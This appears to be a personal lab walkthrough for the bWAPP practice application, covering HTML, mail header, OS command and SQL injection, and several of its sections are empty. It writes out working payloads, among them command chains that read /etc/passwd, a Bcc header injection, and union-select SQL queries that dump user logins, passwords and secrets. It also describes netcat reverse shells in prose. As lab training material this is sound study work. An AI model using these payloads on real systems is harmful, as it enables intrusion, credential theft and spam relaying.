# Level 1

> HTML Injection GET LOW 

  HTML Injection happens when user input is reflected in the webpage without sanitization, allowing insertion of HTML tags.

  What is Validation?

  Validation is the process of checking whether the input is acceptable or not.

  What is Sanitization?

  Sanitization is the process of removing or modifying input to make it acceptable.

👉 GET means:

   Input is passed through URL parameters

  HTML Injection Example Analysis

 Your Test Case
  First Name:** `hi`
  Last Name:** `<h2>you are hacked</h2>`

  ![image](images/image.png)

> HTML Injection GET Medium 

  HTML Injection Example Analysis
  
  Your Test Case
  First Name:** good
  Last Name:** `<h2>hacker</h2>`

  ![image](images/image-1.png)

2. Send to burp  

  ![image](images/image--1.png) 
 

3. make chnages in request  

  GET /bWAPP/htmli_get.php?firstname=good&lastname=hacker<a href=green</a>&form=submit HTTP/1.1

  ![image](images/image-!1.png)

4. go to decoder and paste this  r<a href=green</a>
   click on encoded as set URL 
   again second line 
   click on encoded as set URL

   ![image](images/image-!!1.png)

   copy the last line and paste that line in request 

   ![image](images/image--!1.png)

   copy that request in proxy request and forward all 
   now go to firefox page now see the result 

   ![image](images/image---!1.png)

> HTML Injection GET High
  
  There is no way to bypass this at the time of writing

  ![image](images/image--!!1.png)

# Level 2

> HTML Injection POST LOW

   HTML Injection (POST) occurs when user input sent via POST request is rendered in the webpage without sanitization, allowing HTML tags to be injected.

   POST sends data in the request body

   -HTML Injection Example Analysis

   Your Test Case
   First Name:** <h2>you can inject anyhting here</h2>
   Last Name:** `<a href="hacked">bee</a>

   ![image](images/image2.png)

   -Result: The word "bee" becomes a    link. When clicked, it tries to go to "hacked" page

   -now click on the bee link 

   ![image](images/image-2.png)

   so, we are able to inject html code 

> HTML Injection POST MEDIUM
 
   -HTML Injection Example Analysis

   Your Test Case
   First Name:** <h2>not worked</h2>
   Last Name:bee

   ![image](images/imagem2.png)

   Alright it's not working 

   lets try to url encode our payload

   go to burp & go to decoder 

   paste this in first line 

   <h1>checking if its work./h1>

   click on encoded as set URL

   copy that url paste in last name 

   first name bee 

   ![image](images/image-m2.png)


> HTML Injection POST HIGH

   There is no way to bypass this at the time of writing

   All html special characters are properly sanitized at high level using the htmlspecialchars() function

# Level 3   

> HTML Injection URL LOW

   HTML Injection (URL) occurs when user input passed directly in the URL is reflected in the webpage without sanitization, allowing HTML tags to be rendered.

   -Go to challenge 
   -it can be noticed that,url is rflected in screen 
   -send to burpsuite modify hostname in request then forward in proxy

   4.0.0.10->5.0.0.10(anything it could be )

   ![image](images/image3.png)

    - after modification in burp
    - hostname modified

   ![image](images/image-3.png) 

   - now provide any input at the end of the url and check kif it is relfecting or not 

   ![image](images/image--3.png)

   -after modification

   ![image](images/image---3.png)


   - now try to perform html injection attack in sameway using payload

   /<u>hii</u>

   ![image](images/image-!3.png)

   after modification 

   ![image](images/image--!3.png)

   -payload executed successfully

   -in same way we can explot and perfrom malicious html injection attack 

> HTML Injection URL MEDIUM



# Level 4

> HTML Injection stored(Blog)Low

   Stored HTML Injection occurs when malicious HTML input is saved on the server and rendered to users without sanitization, leading to persistent content manipulation.

  -lets try to inject html code in blog
   for example ,,hacked bee and click on submit after entering this.. it will be shown in Entry 

   ![image](images/image4.png)

  -now lets try to inject html tag&see if it works
   for example,<img src="/images/bee-1.png"> it will be shown in Entry 

   ![image](images/image-4.png)

  -lets try something else
  for example,<h2>you are hacked</h2> it will be shown in Entry 

   ![image](images/image--4.png)

   so,its working that all the given data is reflected in entry

   -This is bcoz the user input is not properly sanitized by application

> HTML Injection stored(Blog)Medium


# Level 5

> LDAP Injection (search)

# Level 6

> Mail Header Injection(SMTP)LOW

   Mail Header Injection occurs when user input is directly inserted into email headers without proper validation. Attackers can exploit this to add extra recipients or spoof emails, which may result in spam or phishing

   -lets give some Input Fields
   ![image](images/image6.png)

   -Send to burp

   ![image](images/image-6.png)

    modify the last line to 

    name=jack&email=hacker%40gmail.com&bcc:hacker2@gmail.com&remarks=hello&form=submit

   ![image](images/image-6.png)

    After changing then in proxy click on forward 

    it showa your msg has sent to our master bee 
    
   ![image](images/image!6.png)

    Document the finding:
     - Vulnerability: SMTP header injection.
     - Impact: Unauthorized email recipients, potential for spam/phishing.
     - Mitigation: Sanitize input, disallow header characters, use safe mail libraries.

# Level 7

> OS Command Injection 

    OS Command Injection (also called Shell Injection) is a critical vulnerability where an attacker tricks an application into executing operating system commands on the server, often leading to full system compromise. It happens when user input is passed directly to the system shell without proper validation.

    -The manually test can be performed by ending the os commands with ; | &&

    -lets give some system commands
    for example www.nsa.gov;ls
                www.nsa.gov;whoami
                www.nsa.gov|whoami 
                www.nsa.gov&&whoami
                www.nsa.gov;cat etc/passwd
                www.nsa.gov && uname 

   ![image](images/image7.png)          

   ![image](images/image-7.png)

     - Vulnerability: OS Command Injection in DNS Lookup form.
     - Impact: Arbitrary system commands can be executed, leading to potential server compromise, data leakage, or denial of service.


# Level 8

> OS Command Injeciton Blind

  In blind OS command injection, Netcat can be used to establish a reverse shell by forcing the target system to initiate a connection back to the attacker’s machine, allowing remote command execution even when output is not visible.

  A reverse shell is when the target machine connects back to the attacker’s machine and gives control of its command line.

  Bypass refers to circumventing a security control or restriction by using alternative techniques to achieve the same objective.

# Level 9

> PHP Code Injection

   PHP Code Injection occurs when user input is executed as PHP code due to unsafe functions like eval(), allowing attackers to execute arbitrary code on the server.

   eval() is a PHP function that executes a string as PHP code, and when used with user input, it can lead to critical vulnerabilities like remote code execution.

# Level 10

> Server Side Includes Injection

   SSI Injection occurs when user input is interpreted as server-side include directives, allowing attackers to execute commands or include files on the server.

# Level 11

> SQL Injection (Search / GET)

    SQL Injection is a vulnerability where an attacker can manipulate a database query by injecting malicious input.

    SQL Injection via GET occurs when user input from URL parameters is directly used in SQL queries without validation, allowing attackers to manipulate the query and access unauthorized data.

    -lets give some input fields(payloads)
      - 1' or 1=1#

   ![image](images/image11.png)

      - ' union select all 1,2,3,4,5,6,7#

   ![image](images/image-11.png) 

      -  ' union select all 1, database(),user(),system_user(),@@version,6,7#;

   ![image](images/image--11.png)

      - 0' union select all 1, concat(id,login),password,email,secret,6,7 from users #;

   ![image](images/image!11.png)

# Level 12

> SQL Injection (Search / POST)

    SQL Injection via POST occurs when user input in POST requests is directly used in SQL queries without validation, allowing attackers to manipulate database queries.

    - on the lesson page , click on search button 

    - Go to burpsuite and add below payload

   ![image](images/image12.png)

    0' union select all 1, concat(id,login),password,email,secret,6,7 from users #

   ![image](images/image-12.png) 

    -on the result page , we can see the user details

# Level 13

> SQL Injection (search / captcha)

    SQL Injection with CAPTCHA indicates that although a CAPTCHA mechanism is present, it does not prevent injection attacks because the user input is still directly used in SQL queries without validation.

# Level 14

> SQL Injection (Select / GET)

    SQL Injection (Select/GET) occurs when user input from URL parameters is directly used in SELECT queries without validation, allowing attackers to manipulate queries and retrieve unauthorized data.

# Level 15

> SQL Injection (Login Form)
   
   It is a vulnerability where an attacker bypasses authentication by injecting SQL into login fields.

# Level 16

> SQL Injection - stored (Blog)

    Stored SQL Injection occurs when malicious SQL input is saved in the database and later executed when the application processes or retrieves that data.
   
# Level 17

> SQL Injection - stored (XML)
 
    Stored SQL Injection (XML) occurs when user input is stored inside an XML structure and later used in a SQL query without sanitization.

    XML (eXtensible Markup Language) is a format used to store and transport structured data.

# Level 18

> SQL Injection - Blind(Search)

    Blind SQL Injection occurs when the application is vulnerable, but it does NOT show database errors or output directly.

# Level 19

> SQL Injection - Blind(Webservices / SOAP)

    It is Blind SQL Injection performed through a SOAP-based web service where input is sent in XML format, and no direct output is visible.

    SOAP (Simple Object Access Protocol) is a protocol used to exchange structured data between applications using XML over a network.

# Level 20  

> XML/XPATH Injection(search)

    

# Level 21

> XML/XPATH Injection(LoginForm)